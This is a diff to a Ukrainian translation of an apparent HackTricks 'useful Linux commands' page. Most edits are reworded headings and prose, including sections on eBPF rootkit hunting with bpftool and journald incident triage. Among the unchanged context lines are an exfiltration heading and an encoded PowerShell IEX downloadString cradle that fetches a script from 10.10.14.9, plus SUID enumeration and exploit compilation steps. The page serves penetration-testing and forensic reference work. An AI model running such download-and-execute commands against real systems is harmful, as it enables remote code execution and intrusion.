@@ -1,5 +1,7 @@
 # Корисні команди Linux
 
+{{#include ../../banners/hacktricks-training.md}}
+
 ## Поширені команди Bash
 ```bash
 #Exfiltration using Base64
@@ -127,7 +129,7 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
-## Bash for Windows
+## Bash для Windows
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
@@ -147,7 +149,7 @@ python pyinstaller.py --onefile exploit.py
 #sudo apt-get install gcc-mingw-w64-i686
 i686-mingw32msvc-gcc -o executable useradd.c
 ```
-## Grep'и
+## Greps
 ```bash
 #Extract emails from file
 grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt
@@ -227,7 +229,7 @@ grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
 #Extract ISBN Numbers
 egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
 ```
-## Пошук
+## Знайти
 ```bash
 # Find SUID set files.
 find / -perm /u=s -ls 2>/dev/null
@@ -256,7 +258,7 @@ find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /p
 # Found Newer directory only and sort by time. (depth = 5)
 find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less
 ```
-## Пошук довідки Nmap
+## Довідка з пошуку в Nmap
 ```bash
 #Nmap scripts ((default or version) and smb))
 nmap --script-help "(default or version) and *smb*"
@@ -299,9 +301,9 @@ iptables -P INPUT DROP
 iptables -P FORWARD ACCEPT
 iptables -P OUTPUT ACCEPT
 ```
-## Телеметрія eBPF та пошук rootkit
+## Телеметрія eBPF та пошук Rootkit
 
-Дослідження rootkit продемонстрували як імпланти на основі eBPF, зокрема TripleCross, так і бекдори на основі BPF, зокрема варіанти BPFDoor. Розглядайте неочікувані BPF-програми, підключення або карти як напрямки для розслідування, а не як доказ компрометації.<sup>[[3]](#references)[[4]](#references)</sup> Створюйте базову картину авторизованих систем за допомогою `bpftool` або `eBPFmon`: `bpftool` може перелічувати програми й карти, дампити інструкції програм і запитувати підтримувані функції, тоді як eBPFmon відображає цю інформацію в TUI.<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>
+Дослідження Rootkit продемонстрували як імпланти на основі eBPF, зокрема TripleCross, так і бекдори на основі BPF, зокрема варіанти BPFDoor. Розглядайте неочікувані BPF-програми, attachment-и або maps як підстави для розслідування, а не як доказ компрометації.<sup>[[3]](#references)[[4]](#references)</sup> Створюйте базову конфігурацію авторизованих систем за допомогою `bpftool` або `eBPFmon`: `bpftool` може перелічувати програми й maps, дампити інструкції програм і запитувати підтримувані функції, тоді як eBPFmon відображає цю інформацію в TUI.<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>
 ```bash
 #Enumerate all eBPF programs, attach points, owning PIDs and map IDs
 sudo bpftool prog
@@ -319,11 +321,11 @@ sudo bpftool feature probe | less
 #TUI wrapper that tracks program/map diffs in real time (wraps bpftool perf/net output)
 sudo ebpfmon
 ```
-Співвідносьте вивід `bpftool` з очікуваними підключеннями NIC/cgroup; раптова поява програми `xdp` або `kprobe`, якою володіє не схвалений PID, є напрямом для розслідування, а не беззаперечним доказом ін’єктованого payload.<sup>[[5]](#references)[[6]](#references)</sup>
+Зіставляйте вивід `bpftool` з очікуваними підключеннями NIC/cgroup; раптова програма `xdp` або `kprobe`, власником якої є несанкціонований PID, є підставою для розслідування, але не беззаперечним доказом впровадженого payload.<sup>[[5]](#references)[[6]](#references)</sup>
 
-## Journald Incident Triage
+## Тріаж інцидентів Journald
 
-`journalctl` зчитує структуровані записи з `systemd-journald` і підтримує фільтрування за завантаженням, пріоритетом, модулем, UID і відносним часом. Поєднуйте ці фільтри з виведенням JSON, коли потрібно зберегти або порівняти докази; саме фільтрування не доводить, що журнали не було підроблено.<sup>[[2]](#references)[[7]](#references)</sup>
+`journalctl` зчитує структуровані записи з `systemd-journald` і підтримує фільтрацію за завантаженням, пріоритетом, unit, UID і відносним часом. Поєднуйте ці фільтри з JSON output, коли потрібно зберегти або порівняти докази; сама фільтрація не доводить, що журнали не було підроблено.<sup>[[2]](#references)[[7]](#references)</sup>
 ```bash
 journalctl --list-boots                                #Enumerate boot IDs with timestamps
 journalctl -b -1 -p err -o short-iso                   #Previous boot only, severity >= err
@@ -334,15 +336,15 @@ journalctl --disk-usage                               #Quickly show journal size
 sudo journalctl --vacuum-size=1G --vacuum-time=7days   #Trim only after taking evidence
 journalctl --no-pager --since="2025-06-01" --until="2025-06-10" > system_logs_2025-06-01_to_06-10.log
 ```
-Додайте `--grep 'Invalid user' --case-sensitive` або `-k` (лише повідомлення ядра), коли потрібні точніші фільтри, і пам’ятайте, що селектори `_PID`, `_SYSTEMD_UNIT`, `_HOSTNAME` і `_TRANSPORT` можна комбінувати для цільового пошуку.<sup>[[7]](#references)</sup>
+Додайте `--grep 'Invalid user' --case-sensitive` або `-k` (лише повідомлення kernel), коли потрібні точніші фільтри, і пам’ятайте, що селектори `_PID`, `_SYSTEMD_UNIT`, `_HOSTNAME` та `_TRANSPORT` можна комбінувати для цільового пошуку.<sup>[[7]](#references)</sup>
 
 ## References
 
-- [1] [eBPFmon: Новий інструмент для дослідження взаємодії із застосунками eBPF](https://redcanary.com/blog/linux-security/ebpfmon/)
-- [2] [Як використовувати команду journalctl для перегляду журналів Linux](https://www.hostinger.com/tutorials/journalctl-command)
+- [1] [eBPFmon: Новий інструмент для дослідження та взаємодії із застосунками eBPF](https://redcanary.com/blog/linux-security/ebpfmon/)
+- [2] [Як використовувати команду journalctl для перегляду Linux-логів](https://www.hostinger.com/tutorials/journalctl-command)
 - [3] [h3xduck/TripleCross](https://github.com/h3xduck/TripleCross)
 - [4] [Rapid7 Labs: BPFdoor у телекомунікаційних мережах](https://www.rapid7.com/blog/post/tr-bpfdoor-telecom-networks-sleeper-cells-threat-research-report/)
-- [5] [Документація BPF — документація ядра Linux](https://docs.kernel.org/bpf/)
+- [5] [Документація BPF — документація Linux kernel](https://docs.kernel.org/bpf/)
 - [6] [libbpf/bpftool](https://github.com/libbpf/bpftool)
 - [7] [journalctl(1) — сторінка посібника Linux](https://man7.org/linux/man-pages/man1/journalctl.1.html)
 {{#include ../../banners/hacktricks-training.md}}
